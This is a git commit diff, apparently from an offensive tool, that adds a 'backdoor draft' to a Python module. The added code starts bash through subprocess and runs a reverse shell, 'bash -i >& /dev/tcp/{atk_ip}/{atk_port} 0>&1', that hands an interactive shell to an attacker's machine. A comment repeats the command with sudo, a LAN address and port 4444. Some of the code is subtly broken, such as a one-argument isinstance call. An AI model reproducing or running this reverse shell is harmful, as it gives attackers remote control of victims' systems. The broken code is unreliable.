b46f7752b51c03c3ebe4077cacd781fcfd6e9c1d
blueh0rse <110935049+blueh0rse@users.noreply.github.com>
2023-12-14 10:01:57 +0100

    backdoor draft

--- modules/backdoor.py
+++ modules/backdoor.py
@@ -2,31 +2,68 @@
 ####################################################     LIBRARIES     ####################################################
 ###########################################################################################################################
 
+import subprocess
 
 
 ###########################################################################################################################
 #################################################     INITIALIZATIONS     #################################################
 ###########################################################################################################################
 
-# Opens a backdoor with the attacker's machine
-def start_backdoor(attacker_ip = None):
-    if type(attacker_ip) == type(None): return
 
-    # PLACE CODE HERE...
+# run commands inside an opened shell
+def run_command(process, command):
+    process.stdin.write(command.encode())
+    process.stdin.flush()  # Ensure the command is sent
+
+
+# Opens a backdoor with the attacker's machine
+def start_backdoor(atk_ip, atk_port):
+    if isinstance(atk_ip) == isinstance(None):
+        print("No IP address was provided for Backdoor module, exiting.")
+        return
+    else:
+        try:
+            # create shell
+            process = subprocess.Popen(
+                ["bash"],
+                stdin=subprocess.PIPE,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+            )
+            run_command(process, f"bash -i >& /dev/tcp/{atk_ip}/{atk_port} 0>&1 \n")
+
+            # read output
+            output = process.stdout.readline()
+            while str(output.strip()) != "b'exit'":
+                print(output.strip())
+                output = process.stdout.readline()
+
+            # close process
+            process.stdin.close()
+            process.terminate()
+            process.wait(timeout=1)
+            is_root = True
+        except RuntimeError:
+            print("An error occured during exploitation...")
+    # sudo bash -i >& /dev/tcp/192.168.1.146/4444 0>&1
 
     return
+
 
 # Closes the backdoor with the attacker's machine
-def stop_backdoor(attacker_ip = None):
-    if type(attacker_ip) == type(None): return
+def stop_backdoor(attacker_ip=None):
+    if type(attacker_ip) == type(None):
+        return
 
     # PLACE CODE HERE...
 
     return
+
 
 ###########################################################################################################################
 #####################################################     PROGRAM     #####################################################
 ###########################################################################################################################
+
 
 def run():
     success = False
